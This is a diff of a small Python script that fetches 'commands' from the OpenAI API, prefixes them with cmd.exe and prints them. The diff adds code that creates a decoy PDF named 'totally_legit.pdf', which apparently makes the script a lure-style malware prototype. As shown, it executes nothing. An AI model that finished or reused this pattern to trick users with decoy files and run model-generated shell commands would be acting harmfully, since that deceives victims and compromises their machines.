@@ -1,8 +1,10 @@
-import os
 import base64
+import os
+from pathlib import Path
 from openai import OpenAI
 from dotenv import load_dotenv
 
+from utils import gen_pdf
 class LameException(Exception):
     pass
 
@@ -25,13 +27,24 @@ def get_commands(key):
         raise LameException(response.error)
     return response.output_text
 
+def gen_artifacts(decoy_pdf):
+        if not decoy_pdf.exists():
+            gen_pdf(decoy_pdf)
+
 def main():
     load_dotenv()
+
+    current_dir = Path.cwd();
+    pdf_loc = current_dir / "totally_legit.pdf"
+    gen_artifacts(pdf_loc)
+
     my_api_key = os.getenv('OPEN_API_KEY')
     if my_api_key is None:
         raise LameException("No Key")
     commands = "cmd.exe " + get_commands(my_api_key)
     print(commands)
+
+
 if __name__ == "__main__":
 
     main()
